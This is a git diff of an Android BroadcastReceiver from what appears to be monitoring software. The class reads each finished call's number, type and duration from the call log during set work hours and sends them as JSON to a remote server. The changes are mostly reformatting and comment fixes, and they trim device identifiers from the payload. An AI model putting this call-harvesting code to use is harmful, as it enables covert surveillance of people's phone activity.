@@ -22,16 +22,17 @@ import com.inet.android.request.DataRequest;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
-/** Êëàññ ñáîðà çâîíêîâ
+/**
+ * Класс сбора звонков
  * 
  * @author johny homicide
- *
+ * 
  */
 public class CallReceiver extends BroadcastReceiver {
 	private Context ctx;
 	private String date;
 	private SharedPreferences sp;
-	private static String LOG_TAG = "callReciver";
+	private static String LOG_TAG = "callReceiver";
 
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
@@ -44,14 +45,14 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
 		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork), 
+			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
 					"isWork return " + Boolean.toString(isWork));
-			Logging.doLog(LOG_TAG, "after isWork retrun 0", 
+			Logging.doLog(LOG_TAG, "after isWork retrun 0",
 					"after isWork retrun 0");
 
 			return;
 		} else {
-			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork), 
+			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
 					"isWork - " + Boolean.toString(isWork));
 		}
 
@@ -71,7 +72,7 @@ public class CallReceiver extends BroadcastReceiver {
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
 				// телефон находится в режиме звонка (набор номера / разговор)
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
-				//  телефон находится в режиме звонка (набор номера / разговор)
+				// телефон находится в ждущем режиме (событие наступает по
 				// окончании разговора,
 				// когда уже знаем номер и факт звонка
 				try {
@@ -101,9 +102,9 @@ public class CallReceiver extends BroadcastReceiver {
 		String phNumber = managedCursor.getString(number);
 		String callType = managedCursor.getString(type);
 		String callDuration = managedCursor.getString(duration);
-//		if (Integer.parseInt(callDuration) < 30) {
-//			callDuration = "5";
-//		}
+		// if (Integer.parseInt(callDuration) < 30) {
+		// callDuration = "5";
+		// }
 		String callTypeStr = null;
 		int dircode = Integer.parseInt(callType);
 
@@ -121,34 +122,19 @@ public class CallReceiver extends BroadcastReceiver {
 			break;
 		}
 
-		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + callType
-				+ " \nCall Date:--- " + date + " \nCall duration in sec :--- "
-				+ callDuration);
+		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
+				+ callType + " \nCall Date:--- " + date
+				+ " \nCall duration in sec :--- " + callDuration);
 		sb.append("\n----------------------------------");
 		managedCursor.close();
 
-//		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
-//				+ "</id><time>" + date + "</time><type>4</type><app>" + callType
-//				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
-//				+ "</ntime></packet>";
-//		String sendJSONStr = "{\"id\":\"" + sp.getString("ID", "0000") + "\","
-//				+ "\"imei\":\"" + sp.getString("IMEI", "0000") + "\","
-//				+ "\"time\":\"" + date + "\","
-//				+ "\"type\":\"2\","
-//				+ "\"app\":\"" + callTypeStr + "\","
-//				+ "\"tel\":\"" + phNumber + "\","
-//				+ "\"duration\":\"" + callDuration + "\"}";
 		String sendJSONStr = null;
 		JSONObject jsonObject = new JSONObject();
 		JSONArray data = new JSONArray();
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
 		try {
-			jsonObject.put("account", sp.getString("account", "0000"));
-			jsonObject.put("device", sp.getString("device", "0000"));
-			jsonObject.put("imei", sp.getString("imei", "0000"));
-			jsonObject.put("key", System.currentTimeMillis());
-
+			
 			info.put("tel", phNumber);
 			info.put("duration", callDuration);
 
@@ -157,16 +143,17 @@ public class CallReceiver extends BroadcastReceiver {
 			object.put("info", info);
 			data.put(object);
 			jsonObject.put("data", data);
-			sendJSONStr = jsonObject.toString();
+			// sendJSONStr = jsonObject.toString();
+			sendJSONStr = data.toString();
 		} catch (JSONException e) {
 			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 		}
 
-		DataRequest dr = new DataRequest(ctx);
-		dr.sendRequest(sendJSONStr);
-
 		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
 		Logging.doLog(LOG_TAG, sendJSONStr);
+
+		DataRequest dr = new DataRequest(ctx);
+		dr.sendRequest(sendJSONStr);
 	}
 
 	@SuppressLint("SimpleDateFormat")
@@ -178,5 +165,3 @@ public class CallReceiver extends BroadcastReceiver {
 
 	}
 }
-		
-	
